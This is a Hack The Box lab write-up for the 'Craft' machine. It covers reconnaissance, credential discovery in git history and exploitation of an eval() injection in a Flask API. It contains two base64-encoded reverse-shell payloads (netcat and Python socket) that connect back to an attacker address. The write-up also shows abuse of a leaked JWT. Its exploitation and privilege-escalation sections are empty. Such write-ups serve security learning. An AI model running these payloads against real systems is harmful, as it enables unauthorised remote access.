# Craft Writeup - by Thammanant Thamtaranon

**Craft** is a medium-difficulty Linux-based machine hosted on Hack The Box.

## Reconnaissance
- I began with a full TCP port scan, including service/version detection and OS fingerprinting:
  `nmap -A -T4 -p- 10.10.10.110`
  ![Nmap_Scan](Nmap_Scan.png)
- The scan revealed the following open ports:
  - **22** — SSH
  - **443** — HTTPS
  -  **6022** — Golang x/crypto/ssh server
- I added `craft.htb` to `/etc/hosts` for proper hostname resolution.

## Scanning & Enumeration
- Visiting https and reading the response from Burp Suite founded additional Vhost name including `api.craft.htb` and `gogs.craft.htb`. We add those to `/etc/hosts`.
  ![Response](Response.png)
- Visiting `api.craft.htb` found swagger API. Unfortuantly we need credentials to use this API.
  ![Swagger](Swagger.png)
- Visiting `gogs.craft.htb` found craft repository.
  ![Gogs](Gogs.png)
- In the issues tab we found user `Dinesh Chugtai` JWT token.
  ![Invalid_JWT_Token](Invalid_JWT_Token.png)
- Putting this token in `jwt.io` show that the token is already expired.
  ![Expired](Expired.png)
- After cloning the repository, we discover that the database is MySQL, the python framework is Flask and in `.gitignore` have a file name `settings.py`. We will note that down for may or maynot be later use.
- Inspecting through repository python file we found a vulnerable code in `brew.py`. The code us `eval()`, The `eval()` function in Python takes a string and executes it as valid Python code.
  ![Vuln1](Vuln1.png)
  ![Vuln2](Vuln2.png)
- We run the command `git log -p` and found user `dinesh` credential.
  ![Credential](Credential.png)
- We then went back to `swagger` and login as user dinesh, obtaining Token.
  ![Valid_JWT_Token](Valid_JWT_Token.png)
- So we now got the token and we know that the parameter `abv` use `eval()` so we need to craft the payload. we try send the encoded payload `"__import__('os').system('echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTYuNCA0NDQ0ID4vdG1wL2YK | base64 -d | bash')"`
  ![RCE_bash](RCE_bash.png)
but failed, we got "ABV must be a decimal value less than 1.0". this means that the it crashed, likely of not having `bash`, so we will try `sh`.
`"__import__('os').system('echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoJzEwLjEwLjE2LjQnLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsnL2Jpbi9zaCcsJy1pJ10pOwo= | base64 -d | python3')"`
  ![RCE_sh](RCE_sh.png)
It worked, we got in as root.
  ![RCE](RCE.png)
## Exploitation


## Privilege Escalation
